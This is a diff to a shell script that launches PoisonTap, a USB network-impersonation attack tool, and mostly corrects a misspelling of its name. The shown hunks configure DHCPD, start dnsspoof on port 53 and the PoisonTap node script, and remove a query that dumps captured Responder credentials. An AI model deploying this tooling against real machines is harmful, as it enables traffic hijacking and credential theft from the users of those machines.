@@ -3,7 +3,7 @@
 # modified script form mubix-lock
 #
 rndis="rndis0" # Older devices use usb0!
-POSION_TAP="/opt/poisontap" # Location of posiontap folder
+POISON_TAP="/opt/poisontap" # Location of poisontap folder
 
 # ================== #
 # Check for root
@@ -74,8 +74,8 @@ ip link set $RNDIS up
 # ================== #
 # Being DHCPD setup  #
 # ================== #
-echo "[+] Creating /root/posiontap-dhcpd.conf"
-cat << EOF > /root/posiontap-dhcpd.conf
+echo "[+] Creating /root/poisontap-dhcpd.conf"
+cat << EOF > /root/poisontap-dhcpd.conf
 # notes below
 ddns-update-style none;
 default-lease-time 600;
@@ -127,7 +127,7 @@ mkdir -p /root/logs
 
 # Samy uses isc-dhcp-server...shouldn't make a difference
 echo "[+] Starting DHCPD server in background..."
-/usr/sbin/dhcpd -cf /root/posiontap-dhcpd.conf
+/usr/sbin/dhcpd -cf /root/poisontap-dhcpd.conf
 
 echo "[+] Wifi must be disabled.  Please disable if you have not yet."
 
@@ -157,10 +157,10 @@ echo "[+] Starting Dnsspoof on screen..."
 screen -dmS dnsspoof /usr/sbin/dnsspoof -i $RNDIS port 53
 
 echo "[+] Starting Poisontap on screen..."
-screen -dmS posiontap /usr/bin/nodejs $POSION_TAP/pi_poisontap.js 
+screen -dmS poisontap /usr/bin/nodejs $POISON_TAP/pi_poisontap.js 
 
 
-echo "Open new terminal and type: screen -r posiontap"
+echo "Open new terminal and type: screen -r poisontap"
 read -p "Press enter to kill when done..."
 
 # ================== #
@@ -183,6 +183,3 @@ ip addr flush dev $RNDIS
 ip link set $RNDIS down
 
 echo "[+] Goodbye!"
-
-# One last read
-sqlite3 /root/responder/Responder.db 'select * from responder'
